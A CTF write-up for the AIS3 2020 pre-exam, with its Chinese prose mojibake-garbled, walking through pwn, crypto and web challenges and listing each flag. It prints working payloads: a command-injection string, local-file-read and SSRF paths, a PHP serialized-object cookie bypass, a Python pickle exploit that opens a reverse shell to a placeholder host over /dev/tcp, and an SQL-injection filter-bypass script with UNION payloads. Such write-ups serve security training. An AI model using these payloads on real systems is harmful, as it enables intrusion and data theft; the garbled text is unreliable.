1AIS3{s7ay_At_h0ME_And_Keep_$Oc1@L_D1$T4Nc3,M0rTyS} Death Crystal é€™é¡Œæ˜¯ format stringï¼Œä½†æ˜¯æœ‰æª¢æŸ¥è¼¸å…¥ï¼Œæ‰€æœ‰å­—éƒ½ä¸èƒ½æœ‰ $, \\, /, ^ï¼Œä¸¦ä¸” % å¾Œé¢éƒ½ä¸èƒ½æœ‰ c, p, n, hï¼Œä¸»è¦æ˜¯ä¸èƒ½ç”¨ $ å»æŒ‡å®šåƒæ•¸ï¼Œä½†æ²’é—œä¿‚å°±å¤šæ”¾å¹¾å€‹ padding ç”¨çš„æŠŠåƒæ•¸æ¨éå»å°±å¥½äº†ï¼Œä»–çš„ flag å·²ç¶“è®€é€²ä¾†æ”¾åˆ° 0x202060 äº†ï¼Œä½†æ˜¯ PIE æœ‰é–‹æ‰€ä»¥é‚„æ˜¯è¦ leak ä¸€ä¸‹ code base addressï¼Œè¦ç¹éæª¢æŸ¥åªè¦å‰é¢éš¨ä¾¿æ”¾å€‹æ•¸å­—å°±å¥½äº†ï¼Œæ¯”å¦‚ %1pï¼Œå…ˆ b'%1p' * 11 + b';%1p' leak å‡º code base addressï¼Œç„¶å¾Œå† b'%d' * 8 + b'%100sAA\\x00' + p64(base + 0x202060) å°±æ‹¿åˆ° flag äº†ã€‚ 1AIS3{FOrM@T_5TRin6_15_$o0o_pOw3rFul_And_eAsY} Meeseeks Box é€™é¡Œæ˜¯ heap é¡Œï¼Œå¾ˆä¸€èˆ¬çš„æœ‰ create, show, delete çš„é¡Œç›®ï¼Œç„¶å¾Œæ²’ä»€éº¼æª¢æŸ¥ï¼Œè€Œä¸”æ˜¯ ubuntu 18.04 æœ‰ tcache å¯ä»¥ç”¨ï¼Œæ‰€ä»¥å…ˆå¼„å€‹å¤ å¤§çš„ chunk ç„¶å¾Œ free æ‰ä»–è®“ä»–é€²åˆ° unsorted bins å°±å¯ä»¥æ‹¿ libc address äº†ï¼Œç„¶å¾Œæœ‰ tcache å¯ä»¥éš¨ä¾¿ double free ä»–å»æŠŠ __malloc_hook å¯«æˆ one gadget çš„ä½å€å°±å®Œæˆäº†ã€‚ 1AIS3{G0D_d4mn!_Mr._M3e5EEk5_g1V3S_Y0U_@_sH31l} Crypto Brontosaurus çµ¦äº†ä¸€å€‹æª”æ¡ˆå« KcufsJ è£¡é¢æ˜¯ jsfuck æ··æ·†éçš„ js codeï¼Œä»–çš„æª”åå°±æ˜¯å€’éä¾†çš„ jsfuckï¼Œæ‰€ä»¥å…§å®¹ä¹Ÿè¦å€’éä¾†ï¼Œé–‹ç€è¦½å™¨ console åŸ·è¡Œä¸€ä¸‹å°±å¥½äº†ã€‚ 1AIS3{Br0n7Os4uru5_ch3at_3asi1Y} T-Rex 123456789101112131415 ! @ # $ % &amp; ! V F Y J 6 1 @ 5 0 M 2 9 L # I W H S 4 Q $ K G B X T A % E 3 C 7 P N &amp; U Z 8 R D O&amp;$ !# $# @% { %$ #! $&amp; %# &amp;% &amp;% @@ $# %# !&amp; $&amp; !&amp; !@ _ $&amp; @% $$ _ @$ !# !! @% _ #! @@ !&amp; _ $# &amp;&amp; #@ !% %$ ## ! # &amp;% @$ _ $&amp; &amp;$ &amp;% %&amp; &amp;&amp; #@ _ !@ %$ %&amp; %! $$ &amp;# !# !! &amp;% @% ## $% !% !&amp; @! #&amp; &amp;&amp; %&amp; !% %$ %# %$ @% ## %@ @@ $% ## !&amp; #% %! %@ &amp;@ %! &amp;@ %$ $# ## %# !$ &amp;% @% !% !&amp; $&amp; &amp;% %# %@ #$ !# &amp;&amp; !&amp; #! %! ## #$ @! #% !! $! $&amp; @&amp; %% @ @ &amp;&amp; #&amp; @% @! @# #@ @@ @&amp; !@ %@ !# !# $# $! !@ &amp;$ $@ !! @! &amp;# @$ &amp;! &amp;# $! @@ &amp;@ !% #% #! &amp;@ &amp;$ @@ &amp;$ &amp;! !&amp; #! !# ## %$ !# !# %$ &amp;! !# @# ## @@ $! $$ %# %$ @% @&amp; $! &amp;! !$ $# #$ $&amp; #@ %@ @$ !% %&amp; %! @% #% $! !! #$ &amp;# ## &amp;# &amp;&amp; $&amp; !! !% $! @&amp; !% &amp;@ !&amp; $! @# !@ !&amp; @$ $% #&amp; #$ %@ %% %% &amp;! $# !# $&amp; #@ &amp;! !# @! !@ @@ @@ ## !@ $@ !&amp; $# % &amp; %% !# !! $&amp; !$ $% !! @$ @&amp; !&amp; &amp;@ #$ &amp;&amp; @% $&amp; $&amp; !% &amp;! &amp;&amp; &amp;@ &amp;% @$ &amp;% &amp;$ &amp;@ $$ } çµ¦äº†ä¸€å¼µè¡¨å’Œå¯†æ–‡ï¼Œå°è¡¨è½‰å›å»å°±å¥½äº†ï¼Œä½†è¦æ³¨æ„ row å’Œ column çš„é †åºï¼Œ&amp;$ æ˜¯ A ä¸æ˜¯ Rã€‚ Octopus é€™é¡Œçµ¦ python script å’Œä»–åŸ·è¡Œå¾Œçš„ outputï¼Œè£¡é¢åœ¨åš BB84 é‡å­å¯†é‘°åˆ†ç™¼ï¼Œå…©é‚Šçš„ Basis éƒ½çµ¦äº†ï¼ŒQubits ä¹Ÿçµ¦äº†ï¼Œå°±æ˜¯æŠŠ Basis ä¸€æ¨£éƒ¨åˆ†çš„é‚£äº› Qubits æŠ“å‡ºä¾†è½‰å› binary å°±å¥½äº†ã€‚ 1AIS3{EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84} Blowfish é€™é¡Œè¦ nc 60.250.197.227 12001ï¼Œæœ‰çµ¦åŸå§‹ç¢¼ï¼Œé‚„æœ‰ä¸€å€‹ python pickle dump çš„æª”æ¡ˆ 1[{'name': 'maojui', 'password': 'SECRET', 'admin': False}, {'name': 'djosix', 'password': 'S3crE7', 'admin': False}, {'name': 'kaibro', 'password': 'GGInIn', 'admin': False}, {'name': 'others', 'password': '_FLAG_', 'admin': False}] é€£ä¸Šå»ä¹‹å¾Œï¼Œä»–æœƒçµ¦ä½ é€™æ®µç”¨ Blowfish çš„ CTR Mode åŠ å¯†çš„çµæœç•¶ä½œ tokenï¼Œæ¥è‘—ä½ å°±å¯ä»¥å†æŠŠ token ä¸Ÿå›å»çµ¦ä»–è§£å¯†ï¼Œä»–æœƒçœ‹ä½ æ˜¯ä¸æ˜¯ adminï¼Œå› ç‚ºæ˜¯ CTR Mode æ‰€ä»¥å°±ç¿»ä¸€ä¸‹ bit å°±å¥½äº†ï¼ŒæŠŠé‚£å€‹ False çš„éƒ¨åˆ†ç¿»æˆ Trueï¼Œå°±é€™éº¼ç°¡å–®ã€‚ è©³æƒ…å¯ä»¥åƒè€ƒ é€™ä»½æŠ•å½±ç‰‡ Bit-Flipping Attack çš„éƒ¨åˆ†ã€‚ 1AIS3{ATk_BloWf1sH-CTR_by_b1t_Flipping_^_^} Camel é€™é¡Œçµ¦äº† sage scriptï¼Œè£¡é¢æœ‰ä¸€å€‹ Elliptic Curveï¼Œä¸¦çµ¦äº†ä¸Šé¢çš„ 9 å€‹é»ï¼Œflag å°±æ˜¯ Elliptic Curve çš„åƒæ•¸ï¼Œå› ç‚ºä»–çµ¦çš„é»çš„ x åº§æ¨™éƒ½æ˜¯ $p-1, p+1, p+2, â€¦$ï¼Œæ‰€ä»¥å¸¶é€² $y^2 = x^3 + a x + b$ å¼å­ mod p ä¹‹å¾Œ p å°±éƒ½ä¸è¦‹äº† $$ \\begin{align} &amp;(p-1)^3 + a (p-1) + b = -1 - a + b \\pmod{p} \\\\ &amp;(p+1)^3 + a (p+1) + b = 1 + a + b \\pmod{p} \\end{align} $$ ä¸Šé¢å…©å¼ç›¸åŠ ä¹‹å¾Œå¯ä»¥å¾—åˆ° 2bï¼Œé‚„æœ‰å…¶ä»–å…©çµ„ p+3, p-3, p+5, p-5 ä¹Ÿæ˜¯åŒæ¨£çš„æƒ…æ³ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥æ‹¿åˆ°ä¸‰çµ„ 2b + kp é€™æ¨£å½¢å¼çš„æ±è¥¿ï¼ŒæŠŠä»–å€‘äº’æ¸›å»åš gcd å°±å¾—åˆ° p äº†ï¼Œæœ‰ p ä¹‹å¾Œå°±å¸¶å›å»å°±å¯ä»¥å¾—åˆ° a, bã€‚ 1AIS3{Curv3_Mak3_M3_Th1nK_Ab0Ut_CaME1_A_P} Turtle é€™é¡Œå°±æ˜¯ Padding Oracle Attackï¼Œæˆ‘æŠŠä»¥å‰çš„ script æ‹¿å‡ºä¾†ç„¶å¾ŒæŠŠ oracle æ›æˆç”¨ requests å»æŠ“å°±å®Œæˆäº†ã€‚ è©³æƒ…å¯ä»¥åƒè€ƒ é€™ä»½æŠ•å½±ç‰‡ Padding Oracle Attack çš„éƒ¨åˆ†ã€‚ 1AIS3{5l0w_4nd_5734dy_w1n5_7h3_r4c3.} Web Squirrel é€™é¡Œç¶²ç«™åœ¨ https://squirrel.ais3.org/ï¼Œæ‰“é–‹çœ‹ä¸€ä¸‹æµé‡æœƒçœ‹åˆ°æœ‰ä¸€å€‹è«‹æ±‚æ˜¯ /api.php?get=/etc/passwdï¼Œçœ‹èµ·ä¾†æ˜¯ç›´æ¥çµ¦ä½  local file inclusionï¼ŒæŠ“ä¸€ä¸‹ç¶²ç«™åŸå§‹ç¢¼ /api.php?get=/var/www/html/api.php 123456789101112131415161718192021&lt;?phpheader('Content-Type: application\\/json');if ($file = @$_GET['get']) { $output = shell_exec(&quot;cat '$file'&quot;); if ($output !== null) { echo json_encode([ 'output' =&gt; $output ]); } else { echo json_encode([ 'error' =&gt; 'cannot get file' ]); }} else { echo json_encode([ 'error' =&gt; 'empty file path' ]);} çœ‹èµ·ä¾†æ˜¯ command injectionï¼Œ/api.php?get='|bash -c 'ls å°±å¯ä»¥åŸ·è¡Œä»»æ„ command äº†ï¼Œls / çœ‹æ ¹ç›®éŒ„æœ‰å€‹ 5qu1rr3l_15_4_k1nd_0f_b16_r47.txt è£¡é¢å°±æ˜¯ flag äº† ( å‰›å¥½æª”åè·Ÿ flag ä¸€æ¨£ï¼ŒçœŸä½›å¿ƒ ) 1AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47} Shark é€™é¡Œç¶²ç«™åœ¨ https://shark.ais3.org/ï¼Œé¦–é æœ‰å€‹é€£çµé»ä¸‹å»å°±æ˜¯ /?path=hint.txtï¼Œåˆæ˜¯ local file inclusionï¼Œä½†æ˜¯ hint èªª 123Please find the other server in the internal network! (flag is on that server) GET http://some-internal-server/flag é‚£å°±å…ˆçœ‹ä¸€ä¸‹åŸå§‹ç¢¼ /?path=/var/www/html/index.phpï¼Œç›´æ¥çœ‹æœƒæ‹¿åˆ° [forbidden]ï¼Œé‚£éš¨ä¾¿ç¹ä¸€ä¸‹ /?path=file:///var/www/html/index.php 1234567891011121314151617181920&lt;?php if ($path = @$_GET['path']) { if (preg_match('/^(\\.|\\/)/', $path)) { // disallow /path/like/this and ../this die('&lt;pre&gt;[forbidden]&lt;/pre&gt;'); } $content = @file_get_contents($path, FALSE, NULL, 0, 1000); die('&lt;pre&gt;' . ($content ? htmlentities($content) : '[empty]') . '&lt;/pre&gt;'); }?&gt;&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;title&gt;ğŸ¦ˆğŸ¦ˆğŸ¦ˆ&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;ğŸ¦ˆğŸ¦ˆğŸ¦ˆ&lt;/h1&gt; &lt;a href=&quot;?path=hint.txt&quot;&gt;Shark never cries?&lt;/a&gt;&lt;/body&gt; æœ‰ç”¨ regex æª¢æŸ¥é–‹é ­ä¸èƒ½æ˜¯ . å’Œ /ï¼Œæ‰€ä»¥ file:// æˆ– php://filter/read=convert.base64-encode/resource= éƒ½å¯ä»¥ç¹ï¼Œå†ä¾†çœ‹ /?path=file:///etc/hosts 1234567127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.22.0.3 02b23467485e ç€è¦½ä¸€ä¸‹ /?path=http://02b23467485e ç™¼ç¾æ˜¯æœ¬æ©Ÿï¼Œé‚£å°±æ‰¾æ‰¾å­ç¶²è·¯ä¸‹çš„é„°å±…å€‘ï¼Œå°±æ‰¾åˆ° /?path=http://172.22.0.2/flag 1AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5} Elephant é€™é¡Œç¶²ç«™åœ¨ https://elephant.ais3.org/ï¼Œé¦–é å¯ä»¥ç™»å…¥ï¼Œéš¨ä¾¿è¼¸å…¥å€‹ username å°±ç™»å…¥äº†ä¸éœ€è¦å¯†ç¢¼ï¼Œç¬¬ä¸€æ­¥ç•¶ç„¶æ˜¯æ‰¾æ‰¾æœ‰æ²’æœ‰åŸå§‹ç¢¼ï¼Œçœ‹äº†ä¸€ä¸‹ robots.txt æ²’æ±è¥¿ï¼Œå†çœ‹ .git æ˜¯ Forbiddenï¼Œä¸­çï¼Œéš¨ä¾¿æ‰¾å€‹ GitDumper æŠŠ .git æŠ“ä¸‹ä¾†ï¼Œgit log çœ‹åˆ°å‰ä¸€å€‹ commit æŠŠåŸå§‹ç¢¼åˆªæ‰äº†ï¼Œgit reset --hard å›å»ï¼ŒåŸå§‹ç¢¼å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;?phpconst SESSION = 'elephant_user';$flag = file_get_contents('/flag');class User { public $name; private $token; function __construct($name) { $this-&gt;name = $name; $this-&gt;token = md5($_SERVER['REMOTE_ADDR'] . rand()); } function canReadFlag() { return strcmp($flag, $this-&gt;token) == 0; }}if (isset($_GET['logout'])) { header('Location: /'); setcookie(SESSION, NULL, 0); exit;}$user = NULL;if ($name = $_POST['name']) { $user = new User($name); header('Location: /'); setcookie(SESSION, base64_encode(serialize($user)), time() + 600); exit;} else if ($data = @$_COOKIE[SESSION]) { $user = unserialize(base64_decode($data));}?&gt;&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;title&gt;Elephant&lt;/title&gt; &lt;meta charset='utf-8'&gt; &lt;link href=&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt; &lt;script src=&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;?php if (!$user): ?&gt; &lt;div id=&quot;login&quot;&gt; &lt;h3 class=&quot;text-center text-white pt-5&quot;&gt;Are you familiar with PHP?&lt;/h3&gt; &lt;div class=&quot;container&quot;&gt; &lt;div id=&quot;login-row&quot; class=&quot;row justify-content-center align-items-center&quot;&gt; &lt;div id=&quot;login-column&quot; class=&quot;col-md-6&quot;&gt; &lt;div id=&quot;login-box&quot; class=&quot;col-md-12&quot;&gt; &lt;form id=&quot;login-form&quot; class=&quot;form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;h3 class=&quot;text-center text-info&quot;&gt;What's your name!?&lt;/h3&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;name&quot; class=&quot;text-info&quot;&gt;Name:&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;name&quot; class=&quot;form-control&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;let me in&quot;&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php else: ?&gt; &lt;h3 class=&quot;text-center text-white pt-5&quot;&gt;You may want to read the source code.&lt;/h3&gt; &lt;div class=&quot;container&quot; style=&quot;text-align: center&quot;&gt; &lt;img src=&quot;images/elephant2.png&quot;&gt; &lt;/div&gt; &lt;hr&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;row justify-content-center align-items-center&quot;&gt; &lt;div class=&quot;col-md-6&quot;&gt; &lt;div class=&quot;col-md-12&quot;&gt; &lt;h3 class=&quot;text-center text-info&quot;&gt;Do you know?&lt;/h3&gt; &lt;h3 class=&quot;text-center text-info&quot;&gt;PHP's mascot is an elephant!&lt;/h3&gt; Hello, &lt;b&gt;&lt;?= $user-&gt;name ?&gt;&lt;/b&gt;! &lt;?php if ($user-&gt;canReadFlag()): ?&gt; This is your flag: &lt;b&gt;&lt;?= $flag ?&gt;&lt;/b&gt; &lt;?php else: ?&gt; Your token is not sufficient to read the flag! &lt;?php endif; ?&gt; &lt;a href=&quot;?logout&quot;&gt;Logout!&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php endif ?&gt;&lt;/body&gt; åªè¦è®“ strcmp($flag, $this-&gt;token) == 0 å°±å¥½å•¦ï¼Œé‚£ strcmp å·²çŸ¥çš„å•é¡Œå°±æ˜¯ä»– compare é™£åˆ—éš¨ç„¶æœƒå™´ Warningï¼Œä½†çµæœæœƒæ˜¯ NULLï¼Œè€Œé€™è£¡æ˜¯ç”¨å…©å€‹ = ä¸æ˜¯ä¸‰å€‹ï¼Œæ‰€ä»¥ NULL == 0ï¼ŒæŠŠä¸‹é¢é€™æ®µ base64 encode å¾Œæ”¾å› Cookie å°±å®Œæˆå•¦ã€‚ 1O:4:&quot;User&quot;:2:{s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:11:&quot;\\x00User\\x00token&quot;;a:0:{}} 1AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry} Snake é€™é¡Œç¶²ç«™åœ¨ https://snake.ais3.org/ ï¼Œé¦–é å°±æ˜¯åŸå§‹ç¢¼äº† 123456789101112131415161718192021222324from flask import Flask, Response, requestimport pickle, base64, tracebackResponse.default_mimetype = 'text/plain'app = Flask(__name__)@app.route(&quot;/&quot;)def index(): data = request.values.get('data') if data is not None: try: data = base64.b64decode(data) data = pickle.loads(data) if data and not data: return open('/flag').read() return str(data) except: return traceback.format_exc() return open(__file__).read() çµ¦ä»– dataï¼Œä»–æœƒ pickle.loadsï¼Œæ²’æœ‰ä»»ä½•æª¢æŸ¥ï¼Œæ‰€ä»¥ç›´æ¥ reverse shell 12345678910import osimport picklefrom base64 import *class Exploit: def __reduce__(self): return(os.system, (('bash -c &quot;bash -i &gt;&amp; /dev/tcp/1.2.3.4/9999 0&gt;&amp;1&quot;'),))ex = Exploit()print(b64decode(pickle.dumps(ex))) 1AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.} Owl é€™é¡Œç¶²ç«™åœ¨ https://turtowl.ais3.org/ï¼Œé¦–é æœ‰ç™»å…¥é é¢ï¼Œä»–æœ‰å€‹ç™½è‰²å­—å¯« GUESS THE STUPID USERNAME / PASSWORDï¼ŒçŒœ admin/admin å°±ç™»é€²å»äº†ï¼Œç™»é€²å»å¾Œï¼Œåˆæœ‰å€‹ç™½è‰²å­—æŒ‰éˆ•å¯« SHOW HINTï¼Œé»ä¸‹å»å°±çœ‹åˆ°åŸå§‹ç¢¼äº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } // Settings ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); date_default_timezone_set('Asia/Taipei'); session_start(); // CSRF if (!isset($_SESSION['csrf_key'])) $_SESSION['csrf_key'] = md5(rand() * rand()); require_once('csrf.php'); $csrf = new Csrf($_SESSION['csrf_key']); if ($action = @$_GET['action']) { function redirect($path = '/', $message = null) { $alert = $message ? 'alert(' . json_encode($message) . ')' : ''; $path = json_encode($path); die(&quot;&lt;script&gt;$alert; document.location.replace($path);&lt;/script&gt;&quot;); } if ($action === 'logout') { unset($_SESSION['user']); redirect('/'); } else if ($action === 'login') { // Validate CSRF token $token = @$_POST['csrf_token']; if (!$token || !$csrf-&gt;validate($token)) { redirect('/', 'invalid csrf_token'); } // Check if username and password are given $username = @$_POST['username']; $password = @$_POST['password']; if (!$username || !$password) { redirect('/', 'username and password should not be empty'); } // Get rid of sqlmap kiddies if (stripos($_SERVER['HTTP_USER_AGENT'], 'sqlmap') !== false) { redirect('/', &quot;sqlmap is child's play&quot;); } // Get rid of you $bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--']; $username = str_ireplace($bad, '', $username); $username = str_ireplace($bad, '', $username); // Auth $hash = md5($password); $row = (new SQLite3('/db.sqlite3')) -&gt;querySingle(&quot;SELECT * FROM users WHERE username = '$username' AND password = '$hash'&quot;, true); if (!$row) { redirect('/', 'login failed'); } $_SESSION['user'] = $row['username']; redirect('/'); } else { redirect('/', &quot;unknown action: $action&quot;); } } $user = @$_SESSION['user'];?&gt;&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;title&gt;ğŸ¦‰ğŸ¦‰ğŸ¦‰ğŸ¦‰&lt;/title&gt; &lt;meta charset='utf-8'&gt; &lt;link href=&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt; &lt;script src=&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;?php if (!$user): ?&gt; &lt;div id=&quot;login&quot;&gt; &lt;h3 class=&quot;text-center text-white pt-5&quot;&gt;GUESS THE STUPID USERNAME / PASSWORD&lt;/h3&gt; &lt;div class=&quot;container&quot;&gt; &lt;div id=&quot;login-row&quot; class=&quot;row justify-content-center align-items-center&quot;&gt; &lt;div id=&quot;login-column&quot; class=&quot;col-md-6&quot;&gt; &lt;div id=&quot;login-box&quot; class=&quot;col-md-12&quot;&gt; &lt;form id=&quot;login-form&quot; class=&quot;form&quot; action=&quot;?action=login&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;&lt;?= htmlentities($csrf-&gt;generate()) ?&gt;&quot;&gt; &lt;h3 class=&quot;text-center text-info&quot;&gt;ğŸ¦‰: &quot;Login to see cool things!&quot;&lt;/h3&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;name&quot; class=&quot;text-info&quot;&gt;Username:&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot;&gt;&lt;br&gt; &lt;label for=&quot;name&quot; class=&quot;text-info&quot;&gt;Password:&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot;&gt;&lt;br&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;Login&quot;&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php else: ?&gt; &lt;h3 class=&quot;text-center text-white pt-5&quot;&gt;&lt;a style=&quot;color: white&quot; href=&quot;/?source&quot;&gt;SHOW HINT&lt;/a&gt;&lt;/h3&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;row justify-content-center align-items-center&quot;&gt; &lt;div class=&quot;col-md-6&quot;&gt; &lt;div class=&quot;col-md-12&quot;&gt; &lt;h3 class=&quot;text-center text-info&quot;&gt;Nothing&lt;/h3&gt; Hello, &lt;b&gt;&lt;?= htmlentities($user) ?&gt;&lt;/b&gt;, nothing here. &lt;a href=&quot;?action=logout&quot;&gt;Logout!&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php endif ?&gt;&lt;/body&gt; å°±æ˜¯ sqlite çš„ SQL Injectionï¼Œè¼¸å…¥çš„ username æœƒç”¨ str_ireplace éæ¿¾å…©æ¬¡ï¼Œå¾ˆå¥½ç¹éï¼Œæ‰“ ///*** å°±æœƒè¢«éæ¿¾æˆ /*ï¼Œæ‰“ selselselectectect å°±æœƒè¢«éæ¿¾æˆ selectï¼Œæ‰€ä»¥å¯«å€‹ç°¡å–®çš„ script è‡ªå‹•è½‰æ› payload 123456789101112131415161718import systable = { ' ': '/**/', '/*': '///***', '*/': '***///', 'union': 'unununionionion', 'select': 'selselselectectect', 'and': 'anananddd', 'or': 'ooorrr', 'where': 'whewhewhererere', 'from': 'frfrfromomom',}inp = sys.argv[1]for t,v in table.items(): inp = inp.replace(t, v)print(inp) æ³¨æ„åˆ° -- é‚„æ˜¯æ²’è¾¦æ³•ç”¨ï¼Œå› ç‚º -selselectect- æœƒè¢«è½‰æˆç©ºçš„ï¼Œselect é †åºåœ¨ -- å‰é¢æœƒå…ˆè¢«éæ¿¾æ‰ï¼Œstr_ireplace æ˜¯ç…§è‘— list ä¸€å€‹å€‹ replace çš„ï¼Œä¸éæˆ‘å€‘ç”¨ /* å°±è¶³å¤ äº†ã€‚ 1'///******///unununionionion///******///selselselectectect///******///null,sql,null///******///frfrfromomom///******///sqlite_master///******///whewhewhererere///******///type='table'///******///limit///******///1///******///offset///******///0///*** å…ˆæŒ– tableï¼Œæ‰¾åˆ° CREATE TABLE garbage ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, value TEXT )ï¼Œåªæœ‰é€™å€‹ garbage å’Œ users 1'///******///unununionionion///******///selselselectectect///******///null,name,null///******///frfrfromomom///******///garbage///******///limit///******///1///******///offset///******///0///*** å†æŒ– db è£¡é¢ï¼ŒæŒ–åˆ°æœ‰å€‹ name æ˜¯ something goodï¼ŒæŒ–ä»–çš„ value å°±çœ‹åˆ° flag äº† 1AIS3{4_ch1ld_15_4_curly_d1mpl3d_lun471c} Rhino é€™é¡Œç¶²ç«™åœ¨ https://rhino.ais3.org/ï¼Œrobots.txt å¯ä»¥çœ‹åˆ°æ±è¥¿ 12345678910111213# RIP robots!User-agent: *Disallow: /Disallow: /index.htmlDisallow: /*.xmlDisallow: /recentDisallow: /assetsDisallow: /aboutDisallow: /*.jsDisallow: /*.jsonDisallow: /node_modulesDisallow: /flag.txt ç„¶å¾Œé€™å€‹ç¶²ç«™çœ‹èµ·ä¾†æ˜¯ç”¨ express æ¶çš„ç„¶å¾Œæ”¾ jekyll ç”¢çš„ blogï¼Œæ—¢ç„¶æ˜¯ js project å…ˆçœ‹å€‹ package.json 123456789101112131415{ &quot;name&quot;: &quot;app&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;scripts&quot;: { &quot;start&quot;: &quot;node chill.js&quot;, &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot; }, &quot;author&quot;: &quot;djosix&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;dependencies&quot;: { &quot;cookie-session&quot;: &quot;^1.4.0&quot;, &quot;express&quot;: &quot;^4.17.1&quot; }} ç„¶å¾Œå°±çœ‹åˆ°åŸå§‹ç¢¼å«åš chill.js 123456789101112131415161718192021222324252627const express = require('express');const session = require('cookie-session');let app = express();app.use(session({ secret: &quot;I'm watching you.&quot;}));app.use('/', express.static('./'));app.get('/flag.txt', (req, res) =&gt; { res.setHeader('Content-Type', 'text/plain'); let n = req.session.magic; if (n &amp;&amp; (n + 420) === 420) res.sendFile('/flag'); else res.send('you are a sad person too');});app.get('*', function(req, res){ res.status(404).sendFile('404.html', { root: __dirname });});app.listen(process.env.PORT, '0.0.0.0'); çœ‹èµ·ä¾†åªè¦è®“ä»–çš„ n &amp;&amp; (n + 420) === 420 å°±å¯ä»¥è®€ flag äº†ï¼Œä»¥å‰å°±å¾ˆå¸¸çœ‹åˆ° FB ä¸Šæœ‰äºº po ä¸€äº› js çš„æ¢—åœ–èªªæ˜ js å¾ˆå¤æ€ªçš„è¡Œç‚ºï¼Œéš¨ä¾¿çœ‹äº†å¹¾å¼µè¤‡ç¿’ä¸€ä¸‹ï¼Œå°±æƒ³åˆ°æœ‰æµ®é»æ•¸èª¤å·®çš„å•é¡Œï¼Œæ‰€ä»¥ n è¨­æˆ 0.00000000000001 å°±å¯ä»¥äº†ï¼Œn æ˜¯å¾ req.session.magic æŠ“çš„ï¼Œæ‰€ä»¥æˆ‘å€‘è¦è¨­ req.session.magic çš„è©±ï¼Œæœ€ç°¡å–®çš„æ–¹å¼å°±æ˜¯è‡ªå·±æŠŠ server æ¶èµ·ä¾†ï¼Œç„¶å¾Œå¤šåŠ ä¸€è¡Œ req.session.magic = 0.00000000000001ï¼Œå°±å¯ä»¥ç”¢å‡º express:sess å’Œ express:sess.sig å…©å€‹ Cookie äº†ï¼Œsig æ˜¯ç”¨å‰é¢è¨­å®šçš„ secret: &quot;I'm watching you.&quot; ç®—å‡ºä¾†çš„ï¼Œè©³æƒ…å¯ä»¥çœ‹ cookie-sessionã€‚ 1AIS3{h4v3_y0u_r34d_7h3_rh1n0_b00k?}","link":"/2020/06/09/ais3-2020-preexam/"},{"title":"ã€å®‰å“é€†å‘ã€‘Android 